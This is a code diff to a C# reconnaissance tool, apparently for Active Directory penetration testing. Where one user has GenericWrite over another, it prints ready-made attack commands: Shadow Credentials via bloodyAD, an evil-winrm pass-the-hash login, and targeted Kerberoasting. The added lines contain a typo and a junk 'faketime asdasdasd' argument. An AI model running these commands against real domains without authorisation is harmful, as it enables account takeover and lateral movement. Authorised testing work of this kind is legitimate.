@@ -292,6 +292,8 @@ namespace Reecon
             // Users
             //
             
+            // Most of these would technically apply to GenericAll as well
+            
             // The User has GenericWrite to another User
 
             if (node1Type == "User" && relationshipType == "GenericWrite" && node2Type == "User")
@@ -300,8 +302,11 @@ namespace Reecon
                 string userDomain = node1Name.Split('@')[1];
                 string otherUserName = node2Name.Split('@')[0];
                 // This abuse can be carried out when controlling an object that has a GenericAll, GenericWrite, WriteProperty or Validated-SPN
-                Console.WriteLine($"- The User {ourUserName} can perform a targeted Kerberoast attack against {otherUserName}");
-                Console.WriteLine($"-- targetedKerberoast.py -d '{userDomain}' -u '{ourUserName}' -p '{"PASSWORD".Recolor(Color.Green)}' --request-user '{otherUserName}'");
+                Console.WriteLine($"-- The User {ourUserName} can perform a Shadow Credentuaks attack against {otherUserName}");
+                Console.WriteLine($"--- faketime asdasdasd bloodyAD -d {userDomain} --host dc01.{userDomain} -u '{ourUserName}' -k add shadowCredentials '{otherUserName}'");
+                Console.WriteLine($"---- evil-winrm -i {userDomain} -u '{otherUserName}' -H '{"NTHASH_FROM_ABOVE".Recolor(Color.Green)}'");
+                Console.WriteLine($"-- The User {ourUserName} can perform a targeted Kerberoast attack against {otherUserName}");
+                Console.WriteLine($"--- targetedKerberoast.py -d '{userDomain}' -u '{ourUserName}' -p '{"PASSWORD".Recolor(Color.Green)}' --request-user '{otherUserName}'");
             }
             
             // The User has WriteSPN to another User
